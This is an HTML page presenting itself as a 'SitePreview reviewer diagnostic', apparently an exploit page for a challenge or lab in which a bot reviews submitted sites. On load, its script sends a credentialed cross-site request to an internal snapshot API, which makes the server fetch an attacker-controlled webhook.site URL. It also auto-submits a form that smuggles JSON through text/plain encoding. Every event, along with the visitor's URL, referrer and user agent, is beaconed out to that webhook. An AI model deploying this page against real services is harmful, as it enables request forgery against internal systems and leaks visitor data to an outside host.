<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SitePreview reviewer diagnostic v6</title>
</head>
<body>
  <h1>Approve</h1>
  <button id="approve" onclick="report('clicked-approve')">Approve</button>
  <button id="reject" onclick="report('clicked-reject')">Reject</button>
  <form id="snapshot-form" method="POST" enctype="text/plain" target="snapshot-window"
        action="http://web:3000/api/snapshot">
    <input name='{"url":"https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source'
           value='form"}'>
  </form>
  <pre id="log"></pre>
  <script>
    const hook = 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/event';
    function report(event, value = '') {
      document.querySelector('#log').textContent += `${event}: ${value}\n`;
      (new Image()).src = `${hook}?event=${encodeURIComponent(event)}&value=${encodeURIComponent(value)}&t=${Date.now()}`;
    }

    report('v6-start', `${location.href}|${document.referrer}|${navigator.userAgent}`);

    fetch('http://web:3000/api/snapshot', {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'include',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify({
        url: 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source=fetch'
      })
    }).then(r => report('fetch-resolved', r.type)).catch(e => report('fetch-error', e.name));

    setTimeout(() => {
      report('form-submit');
      try {
        document.querySelector('#snapshot-form').submit();
        report('form-submit-returned');
      } catch (e) {
        report('form-error', e.name);
      }
    }, 400);
    setTimeout(() => report('alive-1s'), 1000);
    setTimeout(() => report('alive-3s'), 3000);
  </script>
</body>
</html>
